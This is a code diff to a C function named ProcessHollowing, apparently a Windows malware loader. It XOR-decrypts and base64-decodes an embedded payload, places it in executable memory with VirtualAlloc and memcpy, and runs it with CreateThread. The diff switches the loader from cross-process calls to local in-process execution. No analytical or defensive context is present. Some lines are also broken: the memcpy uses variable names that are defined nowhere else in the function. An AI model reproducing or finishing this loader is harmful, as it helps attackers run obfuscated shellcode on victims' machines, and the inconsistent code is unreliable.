@@ -66,7 +66,8 @@ void ProcessHollowing() {
     }
 
     xor_decrypt(decoded_hex, decoded_len, 0xAA); // Use the same key
-
+    decoded_hex[decoded_len] = '\0';
+    
     unsigned char* base64_decoded = (unsigned char*)malloc(decoded_len);
     if (!base64_decoded) {
         printf("Memory allocation failed.\n");
@@ -82,7 +83,7 @@ void ProcessHollowing() {
         return;
     }
 
-    LPVOID allocated_mem = VirtualAllocEx(GetCurrentProcess(), NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    LPVOID allocated_mem = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (allocated_mem == NULL) {
         printf("Failed to allocate memory in target process: %d\n", GetLastError());
         free(decoded_hex);
@@ -90,23 +91,26 @@ void ProcessHollowing() {
         return;
     }
 
-    if (!WriteProcessMemory(GetCurrentProcess(), allocated_mem, base64_decoded, shellcode_len, NULL)) {
-        printf("Failed to write to process memory: %d\n", GetLastError());
-        VirtualFreeEx(GetCurrentProcess(), allocated_mem, 0, MEM_RELEASE);
-        free(decoded_hex);
-        free(base64_decoded);
-        return;
-    }
+    memcpy(execMem, shellcode, shellcodeSize);
 
     DWORD oldProtect;
-    if (!VirtualProtectEx(GetCurrentProcess(), allocated_mem, shellcode_len, PAGE_EXECUTE_READ, &oldProtect)) {
+    if (!VirtualProtect(allocated_mem, shellcode_len, PAGE_EXECUTE_READWRITE, &oldProtect)) {
         printf("Failed to change memory protection: %d\n", GetLastError());
-        VirtualFreeEx(GetCurrentProcess(), allocated_mem, 0, MEM_RELEASE);
+        VirtualFree(allocated_mem, 0, MEM_RELEASE);
         free(decoded_hex);
         free(base64_decoded);
         return;
     }
 
+    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)allocated_mem, NULL, 0, NULL);
+    if (hThread == NULL) {
+        printf("Failed to create remote thread.\n");
+        VirtualFree(allocated_mem, 0, MEM_RELEASE);
+        return;    }
+    
+    WaitForSingleObject(hThread, INFINITE);
+    CloseHandle(hThread);
+    VirtualFree(allocated_mem, 0, MEM_RELEASE);
     free(decoded_hex);
     free(base64_decoded);
     printf("Shellcode is ready for execution.\n");
